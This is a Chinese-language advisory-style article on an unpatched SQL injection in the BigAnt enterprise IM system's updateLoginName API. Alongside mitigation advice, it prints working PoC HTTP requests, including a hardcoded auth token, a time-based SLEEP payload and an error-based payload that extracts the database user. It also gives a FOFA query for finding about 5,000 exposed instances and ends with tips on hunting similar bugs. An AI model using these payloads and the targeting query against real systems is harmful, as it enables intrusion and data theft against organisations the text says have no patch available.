---
title: "【0day】大蚂蚁(BigAnt)即时通讯系统 updateLoginName SQL注入漏洞"
date: 2026-03-01
category: 安全研究
tags: [0day, SQL注入, 企业IM, BigAnt, 漏洞挖掘]
source: https://mp.weixin.qq.com/s/ZrTsB3aQgWCebn7UOYXRbNDayhGyEWobi
---

# 【0day】大蚂蚁(BigAnt)即时通讯系统 updateLoginName SQL注入漏洞

## 1. 问题现状 (Current Status & Problem Analysis)

### 背景描述

大蚂蚁 (BigAnt) 是杭州九麒科技开发的企业级即时通讯（IM）系统在国内政企单位中有广泛应用。2026年3月，安全研究员披露其 `UserController::updateLoginName` 接口存在SQL注入漏洞，**影响版本从5.5.x到最新6.0.1.20250407.1**。

### 漏洞概述

| 属性 | 详情 |
|------|------|
| 漏洞类型 | SQL注入（Error-based） |
| 影响组件 | `/Api/Controller/UserController::updateLoginName` |
| 影响版本 | BigAnt 5.5.x ~ 6.0.1.20250407.1 |
| 披露时间 | 2026-03-01 |
| 严重程度 | **严重（Critical）** |

### 危害评估

| 风险类型 | 描述 | 严重程度 |
|----------|------|----------|
| 敏感信息泄露 | 可通过报错注入获取数据库用户/密码等敏感数据 | 高 |
| 数据篡改 | 可执行UPDATE等写操作修改业务数据 | 高 |
| 认证绕过 | 可能通过SQL注入绕过身份验证机制 | 高 |
| 持久化控制 | 特定配置下可能实现RCE | 高 |

### 影响范围

- 使用大蚂蚁IM系统的政企单位
- 暴露在互联网的企业IM管理后台
- FOFA语法锁定的约 **5,000+** 相关资产

---

## 2. 解决思路与方案对比 (Solution Options & Analysis)

### 漏洞成因分析

**根因**：用户更新登录名的接口直接拼接SQL查询语句，未对 `user_id` 或 `user_login` 参数进行预编译或严格过滤。

### 攻击前提

| 条件 | 说明 |
|------|------|
| 认证 | 需要有效的 `authen` 认证码 |
| 认证获取 | 可参考历史文章 "BigAnt moveDept SQL注入漏洞" 的权限分析部分获取认证 |

### POC分析

```http
POST /api/user/updateLoginName HTTP/1.1
Host: <target>
Content-Type: application/x-www-form-urlencoded

authen=cc7e6a614831d1c6b351a5f12678ed4b94cf98b2a52b1050d6c19433fdeff37d&uid=1&user_login=1&user_id=SQLI_POC
```

**注入点**：`user_id` 参数（报错注入）

### 防御方案对比

| 方案 | 实施难度 | 防御效果 | 紧急程度 |
|------|----------|----------|----------|
| 参数预编译（PreparedStatement） | 中 | ★★★★★ | 立即 |
| 参数强校验（白名单） | 低 | ★★★★☆ | 短期 |
| WAF防护规则 | 低 | ★★★☆☆ | 临时缓解 |
| 网络层隔离 | 低 | ★★★☆☆ | 紧急止血 |

---

## 3. 最佳实践框架 (Best Practice Framework)

### 紧急处置流程

```
漏洞发现 → 确认版本 → 评估暴露面 → 临时缓解 → 官方补丁 → 复测验证
```

### 分场景处置

| 场景 | 处置措施 |
|------|----------|
| 公网暴露 | 立即网络隔离或关闭该接口 |
| 内网部署 | 检查是否可通过VPN/零信任访问控制 |
| 已沦陷 | 立即断网、取证、日志分析、事件响应 |

### 短期临时方案

1. **网络层**：在WAF/防火墙添加规则拦截 `/api/user/updateLoginName` 请求
2. **应用层**：暂时禁用 `updateLoginName` 功能
3. **监控**：增加对该接口的访问日志告警

---

## 4. 具体操作步骤 (Implementation Steps)

### 4.1 资产探测（FOFA）

```bash
# FOFA查询语法
(body="/Public/static/admin/admin_common.js" && body="/Public/lang/zh-cn.js.js") || title="即时通讯 系统登录" && body="/Public/static/ukey/Syunew3.js"
```

### 4.2 漏洞验证

**前置条件**：获取有效的认证码（参考历史文章权限分析）

```bash
# POC验证（请在授权环境下测试）
POST /api/user/updateLoginName HTTP/1.1
Host: <target_ip>
Content-Type: application/x-www-form-urlencoded

authen=<valid_authen>&uid=1&user_login=1&user_id=1' AND (SELECT 1 FROM (SELECT SLEEP(5))x)--
```

### 4.3 数据提取（报错注入）

```bash
# 利用报错注入获取数据库用户
POST /api/user/updateLoginName HTTP/1.1
Host: <target>
Content-Type: application/x-www-form-urlencoded

authen=<valid_authen>&uid=1&user_login=1&user_id=1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,(SELECT user()),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
```

### 4.4 修复验证

```bash
# 修复后该接口应：
# 1. 对所有参数使用预编译SQL
# 2. 参数类型校验（非数字/字母拒绝）
# 3. 接口调用需额外权限验证
```

---

## 5. 总结与建议 (Summary & Recommendations)

### 漏洞总结

| 维度 | 结论 |
|------|------|
| 漏洞类型 | SQL注入（Error-based Blind） |
| 根因 | 接口参数未做预编译处理，直接拼接SQL |
| 影响面 | BigAnt 5.5.x~6.0.1 全部版本 |
| 修复状态 | **厂商尚未发布官方补丁** |

### 紧急建议

1. **立即行动**：
   - 联系九麒科技获取紧急补丁
   - 公网系统立即网络隔离
   - 检查是否已有相关攻击痕迹（日志审计）

2. **短期措施**：
   - 部署WAF规则拦截该接口
   - 加强认证码管理，定期轮换
   - 增加异常访问监控告警

3. **长期改进**：
   - 建立第三方组件版本管理台账
   - 定期安全评估和渗透测试
   - 推动厂商修复或考虑替代产品

### 挖洞思路总结

| 思路 | 说明 |
|------|------|
| 企业IM系统 | 常被忽视但实际暴露面广、安全投入不足 |
| update类接口 | 比select类更易发现注入点 |
| 认证码利用 | 参考历史漏洞获取认证信息 |

---

## 相关资源

- **漏洞来源**：0day收割机公众号（2026-03-01）
- **相关历史漏洞**：BigAnt moveDept SQL注入漏洞（认证分析部分）

---

*文档生成时间：2026-03-01*
